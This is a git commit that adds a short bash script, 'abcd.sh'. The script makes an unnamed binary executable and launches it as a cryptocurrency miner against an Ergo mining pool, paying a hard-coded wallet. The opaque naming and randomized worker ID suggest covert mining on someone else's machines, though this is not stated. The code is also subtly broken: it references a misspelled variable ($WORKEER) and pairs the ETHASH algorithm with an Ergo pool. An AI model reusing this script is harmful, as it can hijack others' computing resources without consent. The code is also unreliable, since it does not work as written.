17f943263ebed79518529dc66612172fea5c0df3
Amiy453 <88759477+Amiy453@users.noreply.github.com>
2021-08-27 15:24:13 +0530

    Create abcd.sh

---
+++ abcd.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+POOL=erg.2miners.com:8888
+WALLET=9iMqaBUiLqGjxMa3C9RhpzuySKUgQL8duLLUeS7dttaP38Musjo
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-ergo)
+chmod +x abcd
+./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
+
+
